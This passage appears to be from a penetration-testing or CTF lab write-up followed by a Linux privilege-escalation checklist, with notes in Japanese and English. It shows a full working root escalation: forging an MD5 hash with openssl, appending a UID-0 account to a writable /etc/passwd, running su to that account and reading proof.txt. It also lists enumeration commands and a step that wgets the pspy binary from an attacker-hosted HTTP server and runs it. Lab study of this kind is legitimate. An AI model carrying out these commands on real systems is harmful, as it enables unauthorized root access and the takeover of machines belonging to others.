cat /etc/passwd > passwd

[benjamin@dibble ~]$ openssl passwd -1 -salt ignite l3ickey
openssl passwd -1 -salt ignite l3ickey
$1$ignite$hJNGMF88rFoclOfis6OHh0

[benjamin@dibble ~]$ echo "l3ickey:$1$ignite$hJNGMF88rFoclOfis6OHh0:0:0:root:/root:/bin/bash" >> passwd
echo "l3ickey:$1$ignite$hJNGMF88rFoclOfis6OHh0:0:0:root:/root:/bin/bash" >> passwd

[benjamin@dibble ~]$ tail passwd
tail passwd
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
unbound:x:997:994:Unbound DNS resolver:/etc/unbound:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:996:993::/var/lib/chrony:/sbin/nologin
benjamin:x:1000:1000::/home/benjamin:/bin/bash
mongod:x:995:992:mongod:/var/lib/mongo:/bin/false
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
l3ickey:$1$ignite$hJNGMF88rFoclOfis6OHh0:0:0:root:/root:/bin/bash

[benjamin@dibble ~]$ cp passwd /etc/passwd
cp passwd /etc/passwd

[benjamin@dibble ~]$ su l3ickey
su l3ickey
Password: l3ickey

[root@dibble benjamin]# id
id
uid=0(root) gid=0(root) groups=0(root)

[root@dibble benjamin]# cd /root
cd /root

[root@dibble ~]# ls
ls
proof.txt

[root@dibble ~]# cat proof.txt
cat proof.txt
e11cb58517f4796040963a4bcf5975d1

```

`proof.txt` を手に入れることができた．

- [ ] Find files owned by any group

```bash
find / -group any_group -type f 2>/dev/null
```

- [ ] Check `.htpasswd` credentials

```bash
$ pwd
/var/www/html
$ ls -a
.htaccess	.htpasswd
$ cat .htpasswd
username:password
```

- [ ] Check network connections

```bash
netstat -tlpn
```

If the owner of the process is `root`, search prvesc.

- [ ] Enumerate scheduled jobs

  - [ ] cron job

  ```bash
  find / -name */cron -type d
  ls -la /var/spool/cron/crontabs/
  ```

  - [ ] [pspy](https://github.com/DominicBreuker/pspy)

  ```bash local
  cd /opt/pentest-tools
  python3 -m http.server 8000
  ```

  ```bash remote
  wget http://192.168.49.205:8000/pspy64
  chmod +x pspy64
  ./pspy64
  ```

- [ ] Check [PayloadsAllTheThings Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

## When you are stuck

- [ ] Are there any areas where you are guessing "it would be ____" without examining the details?

- [ ] Have you tried "all" the information available on the internet? 

